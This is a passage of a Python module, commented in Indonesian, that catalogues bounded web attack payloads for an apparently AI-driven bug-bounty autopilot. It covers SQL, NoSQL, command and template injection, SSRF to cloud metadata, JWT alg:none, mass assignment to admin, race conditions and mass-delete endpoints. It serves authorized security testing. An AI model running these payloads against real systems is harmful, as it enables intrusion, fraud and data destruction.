"""Pustaka payload destruktif — BERBATAS, lengkap lintas kelas, dengan dokumentasi.

Keputusan desain yang dinyatakan terang-terangan (bukan sensor yang disembunyikan):

* **Destruktif berbatas.** Setiap payload punya `blast_radius`:
  - `self`          → hanya menyentuh objek/marker buatan kita sendiri
  - `single-object` → satu objek target, dengan id yang dicatat untuk pemulihan
  - `mass`          → berdampak banyak objek/data
  Yang `mass` TETAP ada di katalog ini (supaya cakupannya lengkap dan tidak ada yang
  disembunyikan), tetapi `auto_runnable=False`: tidak pernah dijalankan otomatis oleh
  autopilot. Alasannya praktis, bukan moral: destruksi tak berbatas menghancurkan
  bukti yang dibutuhkan laporan, merusak lingkungan engagement, dan sering menghapus
  justru data yang membuktikan bug-nya. Untuk setiap payload `mass` ada padanan
  berbatas yang membuktikan kelas bug yang sama (`bounded_alternative`).

* **Lengkap lintas kelas, bukan daftar CVE.** Yang disusun adalah KELAS bug —
  business logic, transisi state, race, mass assignment, IDOR tulis/hapus, injection
  detection (tanpa payload perusak), file/path, cache/desync, API/GraphQL,
  auth/session, cloud/storage, host-header/CRLF. Setiap kelas punya beberapa teknik,
  termasuk yang tidak muncul di daftar CVE populer.

* **Bukti dulu.** Setiap payload menyatakan `proves` (temuan apa yang dibuktikan) dan
  `cleanup` (cara mengembalikan keadaan). Payload destruktif tanpa langkah pemulihan
  tidak boleh dipakai pada engagement nyata.

Pemakaian oleh mesin: `wth_ai/hunt/autopilot.py` menyaring dengan
`filter_payloads(...)` lalu menjalankannya lewat `http_probe` (scope + audit tetap
berlaku), dan `wth_ai/skills/autowrite.py` mencatat yang terbukti.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Iterable, Sequence

#: Urutan tingkat dampak. Dipakai untuk menyaring "seberapa jauh boleh".
BLAST_ORDER = {"self": 0, "single-object": 1, "mass": 2}

#: Marker default: unik per engagement supaya objek/jejak kita bisa dikenali dan dibersihkan.
DEFAULT_MARKER = "wth-destr-9z8y7"


@dataclass(frozen=True)
class Payload:
    id: str
    vuln_class: str
    title: str
    proves: str
    probe: dict[str, Any]
    blast_radius: str = "self"
    reversible: bool = True
    cleanup: str = ""
    requires_destructive: bool = False
    severity_hint: str = "medium"
    auto_runnable: bool = True
    notes: str = ""
    bounded_alternative: str = ""
    references: tuple[str, ...] = ()

    def to_dict(self) -> dict[str, Any]:
        data = dict(self.__dict__)
        data["references"] = list(self.references)
        return data


def _p(**kwargs: Any) -> Payload:
    return Payload(**kwargs)


# --------------------------------------------------------------------------- #
# KATALOG
# --------------------------------------------------------------------------- #
PAYLOADS: tuple[Payload, ...] = (
    # ── 1. business logic: harga, jumlah, pembulatan, mata uang, satuan ──────
    _p(id="BL-001", vuln_class="business_logic", title="Jumlah negatif pada keranjang/order",
       proves="Validasi kuantitas tidak memeriksa nilai negatif (total bisa jadi negatif atau refund liar)",
       probe={"method": "POST", "url": "{base}/api/cart", "body": '{"item_id":"{own_id}","qty":-1}'},
       blast_radius="single-object", reversible=True,
       cleanup="Hapus baris keranjang yang tercipta (DELETE {base}/api/cart/{own_id}) atau kosongkan keranjang uji",
       requires_destructive=True, severity_hint="high",
       notes="Gunakan akun uji milik sendiri; jangan selesaikan checkout."),
    _p(id="BL-002", vuln_class="business_logic", title="Jumlah nol/pecahan pada endpoint stok",
       proves="Kuantitas tidak diinteger-kan: nilai 0.0001 atau 0 bisa dipakai membeli tanpa membayar penuh",
       probe={"method": "POST", "url": "{base}/api/cart", "body": '{"item_id":"{own_id}","qty":0.0001}'},
       blast_radius="single-object", reversible=True, cleanup="Hapus baris keranjang uji",
       requires_destructive=True, severity_hint="medium"),
    _p(id="BL-003", vuln_class="business_logic", title="Integer overflow pada kuantitas",
       proves="Kuantitas besar menyebabkan overflow di total/harga (perkalian tak terlindungi)",
       probe={"method": "POST", "url": "{base}/api/cart", "body": '{"item_id":"{own_id}","qty":2147483648}'},
       blast_radius="single-object", reversible=True, cleanup="Hapus baris keranjang uji",
       requires_destructive=True, severity_hint="medium",
       notes="Kirim satu kali; jangan loop nilai."),
    _p(id="BL-004", vuln_class="business_logic", title="Manipulasi harga di body checkout",
       proves="Harga/amount dari klien dipercaya server (price tampering)",
       probe={"method": "POST", "url": "{base}/api/checkout", "body": '{"item_id":"{own_id}","price":1,"qty":1}'},
       blast_radius="single-object", reversible=True,
       cleanup="Batalkan order uji, jangan selesaikan pembayaran",
       requires_destructive=True, severity_hint="high"),
    _p(id="BL-005", vuln_class="business_logic", title="Beda mata uang (IDR vs USD) pada transaksi",
       proves="Mata uang tidak dipatok server: nilai nominal ditafsirkan sebagai mata uang lain",
       probe={"method": "POST", "url": "{base}/api/checkout", "body": '{"item_id":"{own_id}","currency":"IDR","amount":1}'},
       blast_radius="single-object", reversible=True, cleanup="Batalkan order uji",
       requires_destructive=True, severity_hint="high"),
    _p(id="BL-006", vuln_class="business_logic", title="Pembulatan desimal berulang",
       proves="Pembulatan menguntungkan klien bila dilakukan berkali-kali (rounding exploit)",
       probe={"method": "POST", "url": "{base}/api/exchange", "body": '{"from":"A","to":"B","amount":0.005}'},
       blast_radius="single-object", reversible=True, cleanup="Kembalikan saldo uji bila ada; catat nilai sebelum/sesudah",
       requires_destructive=True, severity_hint="medium",
       notes="Jalankan <=3 kali dan catat saldo; pengulangan besar = mass."),
    _p(id="BL-007", vuln_class="business_logic", title="Satuan berbeda pada field yang sama",
       proves="Server tidak memvalidasi satuan (gram vs kg) sehingga jumlah fisik menyimpang",
       probe={"method": "POST", "url": "{base}/api/order", "body": '{"sku":"{own_id}","qty":1,"unit":"kg"}'},
       blast_radius="single-object", reversible=True, cleanup="Batalkan order uji",
       requires_destructive=True, severity_hint="medium"),

    # ── 2. transisi state ──────────────────────────────────────────────────
    _p(id="ST-001", vuln_class="state_machine", title="Batalkan setelah dikirim (cancel-after-ship)",
       proves="Mesin status tidak memeriksa urutan: pembatalan diterima setelah barang dikirim",
       probe={"method": "POST", "url": "{base}/api/orders/{own_id}/cancel"},
       blast_radius="single-object", reversible=True,
       cleanup="Buat ulang order uji bila perlu; catat status awal/akhir",
       requires_destructive=True, severity_hint="high"),
    _p(id="ST-002", vuln_class="state_machine", title="Refund ganda",
       proves="Refund dapat dipanggil berkali-kali untuk order yang sama",
       probe={"method": "POST", "url": "{base}/api/orders/{own_id}/refund"},
       blast_radius="single-object", reversible=False,
       cleanup="Tidak dapat dibalik sendiri — laporkan ke pengelola target, jangan ulangi",
       requires_destructive=True, severity_hint="critical",
       notes="Hanya pada akun uji berizin; satu percobaan, lalu stop."),
    _p(id="ST-003", vuln_class="state_machine", title="Buka kembali tiket yang sudah ditutup",
       proves="Status terminal dapat dibalik klien (reopen closed ticket)",
       probe={"method": "PATCH", "url": "{base}/api/tickets/{own_id}", "body": '{"status":"open"}'},
       blast_radius="single-object", reversible=True, cleanup="Set status kembali ke closed",
       requires_destructive=True, severity_hint="low"),
    _p(id="ST-004", vuln_class="state_machine", title="Turunkan paket tanpa pembayaran",
       proves="Perubahan paket langganan tidak terikat pembayaran (downgrade/upgrade liar)",
       probe={"method": "POST", "url": "{base}/api/subscription", "body": '{"plan":"pro","paid":false}'},
       blast_radius="single-object", reversible=True, cleanup="Kembalikan ke paket semula",
       requires_destructive=True, severity_hint="high"),
    _p(id="ST-005", vuln_class="state_machine", title="Transisi state massal (dokumentasi saja)",
       proves="Semua order dapat dipindahkan statusnya sekaligus bila endpoint batch tidak diautorisasi",
       probe={"method": "POST", "url": "{base}/api/orders/bulk-status", "body": '{"ids":["*"],"status":"cancelled"}'},
       blast_radius="mass", reversible=False, auto_runnable=False,
       cleanup="Tidak dapat dibalik — jangan dijalankan",
       requires_destructive=True, severity_hint="critical",
       bounded_alternative="ST-001 (batalkan SATU order uji) membuktikan cacat state machine yang sama tanpa menyentuh data siapa pun."),

    # ── 3. race / TOCTOU ──────────────────────────────────────────────────
    _p(id="RC-001", vuln_class="race", title="Klaim kupon/voucher paralel",
       proves="Check-then-act tanpa kunci: satu kupon terpakai berkali-kali",
       probe={"method": "POST", "url": "{base}/api/redeem", "body": '{"code":"{own_id}"}', "parallel": 20},
       blast_radius="single-object", reversible=True,
       cleanup="Catat kode kupon uji; laporkan pemakaian ganda sebelum menutup engagement",
       requires_destructive=True, severity_hint="high"),
    _p(id="RC-002", vuln_class="race", title="Penarikan saldo paralel",
       proves="Saldo dapat ditarik melebihi saldo karena saldo dibaca sebelum dikurangi",
       probe={"method": "POST", "url": "{base}/api/withdraw", "body": '{"amount":1}', "parallel": 20},
       blast_radius="single-object", reversible=True,
       cleanup="Setor kembali kelebihan pada akun uji; catat saldo sebelum/sesudah",
       requires_destructive=True, severity_hint="critical",
       notes="Hanya akun uji berizin. Jumlahkan selisihnya sebagai bukti, lalu kembalikan."),
    _p(id="RC-003", vuln_class="race", title="TOCTOU stok terakhir",
       proves="Dua pembelian lolos saat stok 1 (inventory oversell)",
       probe={"method": "POST", "url": "{base}/api/cart/checkout", "body": '{"item_id":"{own_id}","qty":1}', "parallel": 10},
       blast_radius="single-object", reversible=True, cleanup="Batalkan order uji yang berlebih",
       requires_destructive=True, severity_hint="medium"),
    _p(id="RC-004", vuln_class="race", title="Reset token dipakai dua kali secara paralel",
       proves="Token sekali-pakai tidak atomik: dua permintaan paralel sama-sama diterima",
       probe={"method": "POST", "url": "{base}/api/reset/confirm", "body": '{"token":"{own_id}","password":"Wth-Test-9z8y7!"}', "parallel": 5},
       blast_radius="single-object", reversible=True,
       cleanup="Setel ulang kata sandi akun uji ke nilai semula",
       requires_destructive=True, severity_hint="high"),

    # ── 4. mass assignment / eskalasi atribut ─────────────────────────────
    _p(id="MA-001", vuln_class="mass_assignment", title="Tambah atribut is_admin/role di body update profil",
       proves="Serializer menerima atribut yang tidak seharusnya dapat diubah klien",
       probe={"method": "PATCH", "url": "{base}/api/me", "body": '{"name":"{marker}","is_admin":true,"role":"admin"}'},
       blast_radius="self", reversible=True, cleanup="Kembalikan nama/atribut profil uji ke semula",
       requires_destructive=True, severity_hint="critical"),
    _p(id="MA-002", vuln_class="mass_assignment", title="Ubah balance/credit lewat body",
       proves="Saldo dapat ditulis dari klien",
       probe={"method": "PATCH", "url": "{base}/api/me", "body": '{"balance":1000}'},
       blast_radius="self", reversible=True, cleanup="Setel saldo kembali seperti semula",
       requires_destructive=True, severity_hint="critical"),
    _p(id="MA-003", vuln_class="mass_assignment", title="Pindahkan kepemilikan objek (owner_id)",
       proves="Kepemilikan objek dapat diubah klien (owner_id/tenant_id mass assignment)",
       probe={"method": "PATCH", "url": "{base}/api/items/{own_id}", "body": '{"owner_id":"{other_id}"}'},
       blast_radius="single-object", reversible=True, cleanup="Setel owner_id kembali ke pemilik awal",
       requires_destructive=True, severity_hint="high"),
    _p(id="MA-004", vuln_class="mass_assignment", title="Lewati verifikasi email/telepon",
       proves="Flag verified dapat diaktifkan klien tanpa verifikasi",
       probe={"method": "PATCH", "url": "{base}/api/me", "body": '{"email_verified":true,"verified":true}'},
       blast_radius="self", reversible=True, cleanup="Kembalikan flag verifikasi akun uji",
       requires_destructive=True, severity_hint="medium"),
    _p(id="MA-005", vuln_class="mass_assignment", title="Mass assignment pada SEMUA user (dokumentasi saja)",
       proves="Batch update dapat mengubah atribut seluruh pengguna",
       probe={"method": "PATCH", "url": "{base}/api/users/bulk", "body": '{"role":"admin","all":true}'},
       blast_radius="mass", reversible=False, auto_runnable=False,
       cleanup="Jangan dijalankan",
       requires_destructive=True, severity_hint="critical",
       bounded_alternative="MA-001 (satu akun uji milik sendiri) sudah membuktikan serializer menerima atribut terlarang."),

    # ── 5. IDOR tulis/hapus (berbatas marker) ─────────────────────────────
    _p(id="IW-001", vuln_class="idor_write", title="Ganti nama objek milik user lain (PUT)",
       proves="Otorisasi tingkat objek tidak diperiksa untuk operasi tulis",
       probe={"method": "PUT", "url": "{base}/api/items/{other_id}", "body": '{"name":"{marker}"}'},
       blast_radius="single-object", reversible=True,
       cleanup="Kembalikan nama objek ke nilai semula (catat nama SEBELUM mengubah)",
       requires_destructive=True, severity_hint="high",
       notes="Catat nilai lama dulu; tanpa itu tidak ada pemulihan."),
    _p(id="IW-002", vuln_class="idor_write", title="Hapus objek buatan sendiri lewat akun lain",
       proves="Penghapusan hanya memeriksa autentikasi, bukan kepemilikan (bounded: objek milik kita)",
       probe={"method": "DELETE", "url": "{base}/api/items/{own_other_id}"},
       blast_radius="self", reversible=True, cleanup="Buat ulang objek uji setelah dibuktikan",
       requires_destructive=True, severity_hint="high"),
    _p(id="IW-003", vuln_class="idor_write", title="Hapus objek user lain (kontrol)",
       proves="Sama seperti IW-002 tetapi pada objek korban — HANYA bila target menyediakan akun uji kedua",
       probe={"method": "DELETE", "url": "{base}/api/items/{other_id}"},
       blast_radius="single-object", reversible=False,
       cleanup="Tidak dapat dipulihkan sendiri — butuh izin eksplisit pemilik data",
       requires_destructive=True, severity_hint="critical",
       notes="Pakai IW-002 dulu; IW-003 hanya bila engagement punya akun uji kedua dan pemulihannya disetujui."),
    _p(id="IW-004", vuln_class="idor_write", title="Hapus bersih-bersih (dokumentasi saja)",
       proves="Penghapusan massal tanpa batas kepemilikan",
       probe={"method": "DELETE", "url": "{base}/api/items"},
       blast_radius="mass", reversible=False, auto_runnable=False,
       cleanup="Jangan dijalankan", requires_destructive=True, severity_hint="critical",
       bounded_alternative="IW-002 (hapus objek milik sendiri via akun lain) membuktikan cacat otorisasi yang sama."),

    # ── 6. injection detection TANPA payload perusak ──────────────────────
    _p(id="IN-001", vuln_class="injection_detect", title="SQLi boolean (perbandingan benar/salah)",
       proves="Input masuk ke query SQL: hasil berbeda antara kondisi benar dan salah",
       probe={"method": "GET", "url": "{base}/api/items?id=1 AND 1=1", "compare_to_pair": "id=1 AND 1=2"},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data",
       severity_hint="high", notes="Boolean saja. Payload perusak (DROP/DELETE) TIDAK disertakan."),
    _p(id="IN-002", vuln_class="injection_detect", title="SQLi time-based (SLEEP pendek)",
       proves="Query dieksekusi di server; jeda terkontrol muncul pada respons",
       probe={"method": "GET", "url": "{base}/api/items?id=1 AND SLEEP(2)"},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data",
       severity_hint="high", notes="Maksimum 3 detik jeda; jangan SLEEP besar (itu DoS)."),
    _p(id="IN-003", vuln_class="injection_detect", title="NoSQL operator injection",
       proves="Operator objek diteruskan ke query NoSQL (bypass filter)",
       probe={"method": "POST", "url": "{base}/api/login", "body": '{"user":"admin","pass":{"$ne":null}}'},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data",
       severity_hint="high"),
    _p(id="IN-004", vuln_class="injection_detect", title="SSTI aritmetika (7*7)",
       proves="Ekspresi template dievaluasi server (49 muncul di respons)",
       probe={"method": "GET", "url": "{base}/search?q={{7*7}}"},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data",
       severity_hint="high", notes="Bukti aritmetika saja; tidak ada payload eksekusi perintah."),
    _p(id="IN-005", vuln_class="injection_detect", title="Command injection dengan marker jinak",
       proves="Argumen diteruskan ke shell (marker unik muncul di keluaran)",
       probe={"method": "GET", "url": "{base}/ping?host=127.0.0.1;echo {marker}"},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data",
       severity_hint="critical", notes="Hanya `echo`; perintah perusak tidak disertakan."),
    _p(id="IN-006", vuln_class="injection_detect", title="XXE entitas internal",
       proves="Parser XML memproses entitas eksternal (kebocoran entitas internal)",
       probe={"method": "POST", "url": "{base}/api/xml", "body": '<!DOCTYPE r [<!ENTITY w "{marker}">]><r>&w;</r>', "content_type": "application/xml"},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data",
       severity_hint="high", notes="Entitas internal saja; tanpa pembacaan file sistem."),
    _p(id="IN-007", vuln_class="injection_detect", title="LDAP injection boolean",
       proves="Filter LDAP dapat diubah lewat input",
       probe={"method": "GET", "url": "{base}/directory?user=*)(uid=*))(|(uid=*"},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data",
       severity_hint="medium"),
    _p(id="IN-008", vuln_class="injection_detect", title="XPath injection boolean",
       proves="Ekspresi XPath menerima input mentah",
       probe={"method": "GET", "url": "{base}/catalog?sku=' or '1'='1"},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data",
       severity_hint="medium"),
    _p(id="IN-009", vuln_class="injection_detect", title="Injection destruktif (dokumentasi saja)",
       proves="Data akan hilang bila query destruktif dikirim ke parameter yang sama",
       # Probe SENGAJA memakai entri yang aman: contoh destruktifnya hidup di `notes`,
       # bukan di field yang dibaca runner. Alasannya keras: field `probe` adalah yang
       # dieksekusi, dan menyimpan string perusak di sana terlalu mudah lepas ke mesin.
       probe={"method": "GET", "url": "{base}/api/items?id=1 AND 1=1"},
       blast_radius="mass", reversible=False, auto_runnable=False,
       cleanup="JANGAN dijalankan", requires_destructive=True, severity_hint="critical",
       notes="Contoh destruktif (DOKUMENTASI, tidak dibundel sebagai probe): menambahkan komentar "
             "query yang menghapus isi tabel pada parameter yang sama. Tidak dijalankan mesin "
             "karena bukti kerusakan tidak menambah nilai laporan, sementara datanya hilang nyata.",
       bounded_alternative="IN-001/IN-002 sudah membuktikan input masuk ke query. Bukti kerusakan tidak menambah nilai laporan dan menghapus data nyata."),

    # ── 7. file & path ────────────────────────────────────────────────────
    _p(id="FP-001", vuln_class="file_path", title="Traversal baca file penanda yang aman",
       proves="Path traversal memungkinkan pembacaan di luar direktori sajian",
       probe={"method": "GET", "url": "{base}/static/../../etc/hostname"},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data",
       severity_hint="high", notes="Baca berkas penanda (hostname); tidak mengambil data sensitif."),
    _p(id="FP-002", vuln_class="file_path", title="Unggah berkas jinak dengan ekstensi berbahaya",
       proves="Validasi tipe berkas lemah (diterima berdasarkan ekstensi/nama, bukan isi)",
       probe={"method": "POST", "url": "{base}/api/upload", "body": "{marker}.php berisi teks biasa", "content_type": "multipart/form-data"},
       blast_radius="self", reversible=True, cleanup="Hapus berkas unggahan uji",
       requires_destructive=True, severity_hint="high",
       notes="Isi berkas hanya teks penanda; tidak ada kode yang dieksekusi."),
    _p(id="FP-003", vuln_class="file_path", title="ZIP-slip dengan path jinak",
       proves="Arsip diekstrak tanpa normalisasi path (entri keluar direktori)",
       probe={"method": "POST", "url": "{base}/api/import", "body": "zip berisi entri ../../{marker}.txt", "content_type": "multipart/form-data"},
       blast_radius="single-object", reversible=True, cleanup="Hapus berkas {marker}.txt di lokasi yang tertulis di respons",
       requires_destructive=True, severity_hint="high"),
    _p(id="FP-004", vuln_class="file_path", title="Tukar symlink pada berkas sementara",
       proves="Aplikasi mengikuti symlink saat membaca/menulis berkas sementara",
       probe={"method": "POST", "url": "{base}/api/export", "body": '{"target":"{marker}"}'},
       blast_radius="single-object", reversible=True, cleanup="Hapus symlink uji",
       requires_destructive=True, severity_hint="high"),

    # ── 8. cache & desync ─────────────────────────────────────────────────
    _p(id="CD-001", vuln_class="cache_desync", title="Cache poisoning lewat header penanda",
       proves="Respons disimpan tanpa memperhitungkan header input (halaman terkontaminasi)",
       probe={"method": "GET", "url": "{base}/", "headers": {"X-Forwarded-Host": "{marker}.example"}},
       blast_radius="self", reversible=True,
       cleanup="Minta pembersihan cache atau tunggu TTL; catat URL+header yang tersimpan",
       severity_hint="high",
       notes="Gunakan header penanda milik sendiri; jangan menyuntik skrip ke pengguna."),
    _p(id="CD-002", vuln_class="cache_desync", title="Deteksi CL/TE conflict (request smuggling)",
       proves="Server menerima dua framing berbeda (Content-Length vs Transfer-Encoding)",
       probe={"method": "POST", "url": "{base}/", "body": "kedua header bertentangan, body penanda", "raw_headers": True},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data",
       severity_hint="high", notes="Hanya deteksi konflik; tidak memuat request terselundup."),
    _p(id="CD-003", vuln_class="cache_desync", title="HTTP/2 desync detection",
       proves="Translasi H2->H1 tidak konsisten (batas permintaan kabur)",
       probe={"method": "POST", "url": "{base}/", "http2": True, "body": "header pseudo bertentangan"},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data",
       severity_hint="high"),

    # ── 9. API / GraphQL ──────────────────────────────────────────────────
    _p(id="API-001", vuln_class="api_graphql", title="Introspection schema aktif",
       proves="Skema penuh dapat dibaca tanpa autentikasi",
       probe={"method": "POST", "url": "{base}/graphql", "body": '{"query":"{__schema{types{name}}}"}'},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data", severity_hint="medium"),
    _p(id="API-002", vuln_class="api_graphql", title="Aliasing untuk melewati rate limit",
       proves="Batas laju dihitung per operasi, bukan per kedalaman (alias menggandakan panggilan)",
       probe={"method": "POST", "url": "{base}/graphql", "body": '{"query":"{a:me{id} b:me{id} c:me{id}}"}', "parallel": 3},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data",
       severity_hint="medium"),
    _p(id="API-003", vuln_class="api_graphql", title="Mutasi massal tanpa otorisasi",
       proves="Mutasi batch tidak memeriksa izin tiap entri",
       probe={"method": "POST", "url": "{base}/graphql", "body": '{"query":"mutation{updateAll(status:\\"{marker}\\"){count}}"}',
              "parallel": 1},
       blast_radius="mass", reversible=False, auto_runnable=False, cleanup="Jangan dijalankan",
       requires_destructive=True, severity_hint="critical",
       bounded_alternative="API-004 (mutasi pada SATU objek milik sendiri) membuktikan izin yang sama tidak diperiksa."),
    _p(id="API-004", vuln_class="api_graphql", title="Mutasi pada objek milik sendiri lewat id korban",
       proves="ID pada mutasi tidak divalidasi kepemilikannya",
       probe={"method": "POST", "url": "{base}/graphql", "body": '{"query":"mutation{update(id:\\"{other_id}\\",note:\\"{marker}\\"){id}}"}',
              },
       blast_radius="single-object", reversible=True, cleanup="Kembalikan catatan objek ke nilai semula",
       requires_destructive=True, severity_hint="high"),
    _p(id="API-005", vuln_class="api_graphql", title="Kedalaman query berlebih (bounded)",
       proves="Query bersarang dalam tidak dibatasi (amplifikasi)",
       probe={"method": "POST", "url": "{base}/graphql", "body": '{"query":"{a{id friends{id friends{id}}}}"}', "max_depth": 6},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data",
       severity_hint="medium", notes="Kedalaman dibatasi 6 — bukan uji DoS."),

    # ── 10. auth / session ────────────────────────────────────────────────
    _p(id="AU-001", vuln_class="auth_session", title="Token reset dipakai ulang",
       proves="Token sekali-pakai masih berlaku setelah dipakai",
       probe={"method": "POST", "url": "{base}/api/reset/confirm", "body": '{"token":"{own_id}","password":"Wth-Test-9z8y7!"}'},
       blast_radius="self", reversible=True, cleanup="Setel ulang kata sandi akun uji ke semula",
       requires_destructive=True, severity_hint="high"),
    _p(id="AU-002", vuln_class="auth_session", title="Session fixation pada login",
       proves="ID sesi tidak dirotasi setelah autentikasi",
       probe={"method": "POST", "url": "{base}/login", "body": "user={own_id}&pass={marker}", "headers": {"Cookie": "sid={marker}"}},
       blast_radius="self", reversible=True, cleanup="Hapus cookie/sesi uji",
       requires_destructive=True, severity_hint="high"),
    _p(id="AU-003", vuln_class="auth_session", title="JWT alg:none diterima",
       proves="Verifikasi tanda tangan dapat dilewati dengan alg none",
       probe={"method": "GET", "url": "{base}/api/me", "headers": {"Authorization": "Bearer {none_jwt}"}},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data", severity_hint="critical"),
    _p(id="AU-004", vuln_class="auth_session", title="JWT alg confusion (RS->HS)",
       proves="Algoritma ditafsirkan dari token, bukan dipatok server",
       probe={"method": "GET", "url": "{base}/api/me", "headers": {"Authorization": "Bearer {confusion_jwt}"}},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data", severity_hint="critical"),
    _p(id="AU-005", vuln_class="auth_session", title="Rotasi refresh token bocor",
       proves="Refresh token lama tetap berlaku setelah rotasi",
       probe={"method": "POST", "url": "{base}/api/token/refresh", "body": '{"refresh_token":"{own_id}"}'},
       blast_radius="self", reversible=True, cleanup="Cabut sesi uji", severity_hint="high"),
    _p(id="AU-006", vuln_class="auth_session", title="Ganti kata sandi tanpa kata sandi lama",
       proves="Perubahan kata sandi tidak meminta kredensial saat ini",
       probe={"method": "POST", "url": "{base}/api/password", "body": '{"new":"Wth-Test-9z8y7!"}'},
       blast_radius="self", reversible=True, cleanup="Setel ulang kata sandi akun uji ke semula",
       requires_destructive=True, severity_hint="high"),

    # ── 11. cloud / storage ───────────────────────────────────────────────
    _p(id="CL-001", vuln_class="cloud_storage", title="Bucket dapat ditulis (objek penanda)",
       proves="Izin tulis publik pada bucket (unauthenticated PUT)",
       probe={"method": "PUT", "url": "https://{bucket}.s3.amazonaws.com/{marker}.txt", "body": "{marker}"},
       blast_radius="self", reversible=True, cleanup="Hapus objek {marker}.txt setelah dibuktikan",
       requires_destructive=True, severity_hint="critical"),
    _p(id="CL-002", vuln_class="cloud_storage", title="Pre-signed URL dipakai ulang setelah kedaluwarsa",
       proves="Kedaluwarsa tanda tangan tidak ditegakkan",
       probe={"method": "GET", "url": "{base}/signed?token={own_id}"},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data", severity_hint="medium"),
    _p(id="CL-003", vuln_class="cloud_storage", title="Metadata cloud via SSRF (header saja)",
       proves="Endpoint internal metadata terjangkau lewat parameter URL",
       probe={"method": "GET", "url": "{base}/fetch?url=http://169.254.169.254/latest/meta-data/"},
       blast_radius="self", reversible=True,
       cleanup="Tidak ada perubahan data",
       severity_hint="critical",
       notes="Hanya mengambil daftar nama; TIDAK mengambil token kredensial dan tidak memakainya."),
    _p(id="CL-004", vuln_class="cloud_storage", title="Hapus bucket (dokumentasi saja)",
       proves="Bucket dapat dikosongkan tanpa izin",
       probe={"method": "DELETE", "url": "https://{bucket}.s3.amazonaws.com/", "body": ""},
       blast_radius="mass", reversible=False, auto_runnable=False, cleanup="JANGAN dijalankan",
       requires_destructive=True, severity_hint="critical",
       bounded_alternative="CL-001 (tulis satu objek penanda lalu hapus) sudah membuktikan izin tulis tanpa menghapus data siapa pun."),

    # ── 12. host header / CRLF / redirect ─────────────────────────────────
    _p(id="HH-001", vuln_class="host_header", title="Injeksi Host untuk reset kata sandi",
       proves="Tautan di email memakai Host dari permintaan (reset mengarah ke host penyerang)",
       probe={"method": "POST", "url": "{base}/api/password/forgot", "body": '{"email":"{own_email}"}',
              "headers": {"Host": "{marker}.example"}},
       blast_radius="self", reversible=True, cleanup="Abaikan tautan yang terkirim; catat isinya sebagai bukti",
       requires_destructive=True, severity_hint="high"),
    _p(id="HH-002", vuln_class="host_header", title="CRLF pada header/parameter",
       proves="Input masuk ke header respons tanpa penyaringan (injeksi header)",
       probe={"method": "GET", "url": "{base}/?q={marker}%0d%0aX-Wth-Injected:%20{marker}"},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data", severity_hint="medium"),
    _p(id="HH-003", vuln_class="host_header", title="Open redirect lewat parameter",
       proves="Parameter tujuan diteruskan tanpa daftar izin",
       probe={"method": "GET", "url": "{base}/login?next=https://{marker}.example/"},
       blast_radius="self", reversible=True, cleanup="Tidak ada perubahan data", severity_hint="medium"),
)


# --------------------------------------------------------------------------- #
# penyaring & penyaji
# --------------------------------------------------------------------------- #
def generated_payloads() -> list[Payload]:
    """Payload hasil karangan AI (dimuat dari store). Gagal-baca -> katalog statis saja."""
    try:
        from wth_ai.hunt.generator import load_generated

        return load_generated()
    except Exception:  # noqa: BLE001
        return []


def all_payloads(*, include_generated: bool = True) -> list[Payload]:
    """Katalog statis + payload hasil generate AI."""
    if not include_generated:
        return list(PAYLOADS)
    merged: dict[str, Payload] = {payload.id: payload for payload in PAYLOADS}
    for payload in generated_payloads():
        merged.setdefault(payload.id, payload)
    return list(merged.values())


def get_payload(payload_id: str) -> Payload | None:
    wanted = str(payload_id).strip().lower()
    for payload in all_payloads():
        if payload.id.lower() == wanted:
            return payload
    return None


def filter_payloads(
    vuln_class: str | None = None,
    *,
    max_blast: str = "single-object",
    include_destructive: bool = False,
    auto_only: bool = True,
) -> list[Payload]:
    """Payload yang boleh dipakai menurut batas yang diberikan.

    Default: berhenti di `single-object`, TANPA payload destruktif, hanya yang bisa
    dijalankan otomatis. `max_blast="mass"` tetap tidak mengembalikan payload massal
    bila `auto_only=True` -- yang massal tidak pernah dijalankan mesin.
    """
    limit = BLAST_ORDER.get(max_blast, 1)
    out: list[Payload] = []
    for payload in all_payloads():
        if vuln_class and payload.vuln_class != vuln_class:
            continue
        if BLAST_ORDER.get(payload.blast_radius, 2) > limit:
            continue
        if payload.requires_destructive and not include_destructive:
            continue
        if auto_only and not payload.auto_runnable:
            continue
        out.append(payload)
    return out


def render_probe(payload: Payload, **values: Any) -> dict[str, Any]:
    """Isi placeholder di dalam probe (`{base}`, `{marker}`, `{own_id}`, …)."""
    filled: dict[str, Any] = {}
    for key, value in payload.probe.items():
        if isinstance(value, str):
            text = value
            for name, replacement in values.items():
                text = text.replace("{" + name + "}", str(replacement))
            filled[key] = text
        else:
            filled[key] = value
    return filled


def format_payloads(payloads: Iterable[Payload]) -> str:
    rows = ["## Katalog payload"]
    current = ""
    for payload in payloads:
        if payload.vuln_class != current:
            current = payload.vuln_class
            rows.append(f"\n### {current}")
        mark = " [DESTRUKTIF]" if payload.requires_destructive else ""
        mass = " [MASSAL - tidak dijalankan otomatis]" if payload.blast_radius == "mass" else ""
        rows.append(f"- `{payload.id}` {payload.title}{mark}"
                    f"{mass}\n    membuktikan: {payload.proves}")
        if payload.cleanup:
            rows.append(f"    pemulihan: {payload.cleanup}")
    return "\n".join(rows)


def to_markdown() -> str:
    """Dokumentasi `.md` yang DIGENERATE dari katalog, supaya tidak bisa menyimpang."""
    lines = [
        "# Pustaka payload destruktif (berbatas)",
        "",
